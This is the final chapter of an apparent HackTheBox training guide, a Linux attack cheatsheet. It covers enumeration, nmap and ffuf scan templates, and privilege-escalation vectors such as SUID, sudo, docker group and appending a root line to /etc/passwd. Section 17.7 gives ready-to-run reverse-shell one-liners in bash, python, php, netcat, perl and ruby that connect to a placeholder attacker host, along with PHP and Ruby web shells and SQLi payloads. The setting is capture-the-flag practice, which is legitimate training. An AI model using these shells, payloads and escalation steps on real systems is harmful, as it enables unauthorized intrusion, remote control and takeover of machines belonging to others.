[◀ Prev: Tools & Reference](16-tools-reference.md) · [🏠 Index](README.md)

---

# 17 · Master Cheatsheet — All Levels

## 17.1 HTB Linux Attack Decision Tree

| You Find… | Immediate Action | Follow-up If Stuck |
| --- | --- | --- |
| Port 80/443 | `whatweb`, `gobuster dir`, `nikto`, check `robots.txt` | Fuzz extensions, check all HTTP methods, vhost fuzz |
| Login form | Default creds, SQLi (`' OR 1=1--`), user enumeration | Check response sizes, password reset, JWT analysis |
| File upload | Upload PHP shell, bypass with extensions/MIME | Try `.htaccess`, polyglot, exiftool metadata injection |
| Input field (any) | SQLi, SSTI, XSS, command injection test payloads | Check all HTTP params, headers, cookies too |
| User shell | `sudo -l`, SUID find, linpeas, pspy | Check writable files, internal ports, history files |
| Service on 127.0.0.1 | Port forward to attacker, enumerate locally | Check service version CVEs, default creds |
| Credential found | Try on SSH, FTP, web, `su -` for all local users | Password variations, hash cracking, spray all services |
| Config/source file | grep for passwords, secrets, API keys | Check git history, backup files, `.env` files |
| SUID binary | GTFOBins SUID, strings, ltrace | Check if it calls relative commands (PATH hijack) |
| Cron job (pspy) | Check if script is writable, check wildcard `*` | Write to script, inject via PATH, tar wildcard |
| Group membership | docker: mount host FS; lxd: image import; disk: dd | `id -Gn` — check all group-specific attack paths |

## 17.2 Privilege Escalation Quick Reference

| Vector | Check Command | Exploit |
| --- | --- | --- |
| sudo -l | `sudo -l` | GTFOBins or overwrite script/binary |
| SUID | `find / -perm -4000 2>/dev/null` | GTFOBins SUID or strings+ltrace |
| Capabilities | `getcap -r / 2>/dev/null` | `cap_setuid` → `setuid(0); system('/bin/bash')` |
| Cron | `/tmp/pspy` + `crontab -l` + `/etc/crontab` | Overwrite script or wildcard injection |
| Writable service | `systemctl list-units`; `find /etc/systemd -writable` | Overwrite service binary/ExecStart |
| /etc/passwd write | `ls -la /etc/passwd` | Append `hacker:hash:0:0:root:/root:/bin/bash` |
| Docker group | `id \| grep docker` | `docker run -v /:/mnt alpine chroot /mnt sh` |
| LXD group | `id \| grep lxd` | Import alpine image, mount `/`, chroot |
| NFS squash | `cat /etc/exports \| grep no_root` | Mount from root, create SUID bash |
| PATH hijack | `strings suid_bin` + `echo $PATH` | Create fake binary in `/tmp`, prepend to PATH |
| LD_PRELOAD | `sudo -l` (env_keep) | Compile `.so` with `_init()` calling setuid+bash |
| Shared obj miss | `ldd suid_bin \| grep 'not found'` | Create malicious `.so` in writable lib path |
| Kernel | `uname -r` + `les.sh` | DirtyPipe/DirtyCow/PwnKit if version matches |
| Weak password | `cat /etc/shadow` → john | Crack hash, try on all users and services |

## 17.3 Shell Upgrade Quick Reference

```bash
# Python full TTY (most reliable)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
reset; export TERM=xterm; export SHELL=bash; stty rows 40 cols 180

# script (when python not available)
script /dev/null -c bash

# socat (cleanest full TTY)
# Attacker: socat file:`tty`,raw,echo=0 tcp-listen:4444
# Target:   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444
```

## 17.4 Wordlists Quick Reference

| Wordlist | Path | Best For |
| --- | --- | --- |
| rockyou.txt | `/usr/share/wordlists/rockyou.txt` | Password cracking (all types) |
| directory-list-2.3-medium | `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt` | Web directory fuzzing (standard) |
| directory-list-2.3-big | `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt` | Web directory fuzzing (thorough) |
| common.txt | `/usr/share/seclists/Discovery/Web-Content/common.txt` | Quick web enum (5K entries) |
| api-endpoints | `/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt` | REST API endpoint discovery |
| subdomains-5000 | `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt` | Subdomain and vhost discovery |
| names.txt | `/usr/share/seclists/Usernames/Names/names.txt` | Username enumeration |
| burp-parameter-names | `/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt` | Hidden parameter discovery |
| snmp-community.txt | `/usr/share/seclists/Discovery/SNMP/snmp.txt` | SNMP community string brute |

## 17.5 Full nmap Scan Templates

```bash
# ── STANDARD HTB SCAN SEQUENCE ──────────────────────────────────────
# 1. Fast all-ports
sudo nmap -p- --min-rate 5000 -T4 $TARGET -oA nmap/allports 2>/dev/null
PORTS=$(grep '/tcp.*open' nmap/allports.nmap | awk -F/ '{printf "%s,",$1}' | sed 's/,$//')

# 2. Detailed service scan
sudo nmap -sV -sC -p$PORTS $TARGET -oA nmap/detailed

# 3. UDP top 20
sudo nmap -sU --top-ports 20 $TARGET -oA nmap/udp

# 4. Targeted scripts
sudo nmap --script='vuln' -p$PORTS $TARGET -oA nmap/vuln

# ── QUICK ONE-LINER ──────────────────────────────────────────────────
sudo nmap -sV -sC -p$(sudo nmap -p- --min-rate 5000 $TARGET | grep '^[0-9]' | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//') $TARGET -oA nmap/combined
```

## 17.6 Web Fuzzing Templates

```bash
# ── DIRECTORY FUZZING ────────────────────────────────────────────────
ffuf -u http://$TARGET/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -e .php,.html,.txt,.bak,.conf,.js,.json \
  -mc 200,301,302,401,403 -t 100 -o web/ffuf_dir.json

# ── VHOST FUZZING ────────────────────────────────────────────────────
ffuf -u http://$TARGET -H 'Host: FUZZ.TARGET_DOMAIN' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -mc 200,301,302 -fs $(curl -s http://$TARGET | wc -c)

# ── PARAMETER FUZZING ────────────────────────────────────────────────
ffuf -u 'http://$TARGET/page?FUZZ=test' \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200 -fs [default_size]

# ── API ENDPOINT FUZZING ─────────────────────────────────────────────
ffuf -u http://$TARGET/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,401,403
```

## 17.7 Reverse Shell Quick Reference

```bash
# bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1

# python3
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'

# php
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# netcat (mkfifo)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc LHOST LPORT >/tmp/f

# perl
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")'

# ruby
ruby -rsocket -e 'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

```text
# Web shells
<?php system($_GET['cmd']); ?>              # PHP
<?php echo shell_exec($_GET['cmd']); ?>     # PHP alt
<%=`#{params[:cmd]}`%>                      # Ruby ERB
{{ request.application.__globals__... }}    # Python SSTI
```

---

> [!TIP]
> **Final tips for HTB success:**
> 1. Enumerate fully before exploiting — ~80% of the answer is in enumeration.
> 2. Take notes on everything — usernames, ports, file paths, credentials, error messages.
> 3. When stuck, try harder enumeration rather than different exploits.
> 4. The difficulty rating tells you roughly how obvious the path is — on Insane, nothing is obvious.
> 5. Search for the exact version of every service you find — CVEs are version-specific.
> 6. Always try credential reuse across all services and all users.
> 7. After getting a shell, run linpeas immediately **and** pspy in the background.
> 8. Submit flags immediately — don't lose them in a crash or reset.

<div align="center">

**— END OF GUIDE — Happy Hacking on HackTheBox! 🐧⚔️**

</div>

---

[◀ Prev: Tools & Reference](16-tools-reference.md) · [🏠 Index](README.md)
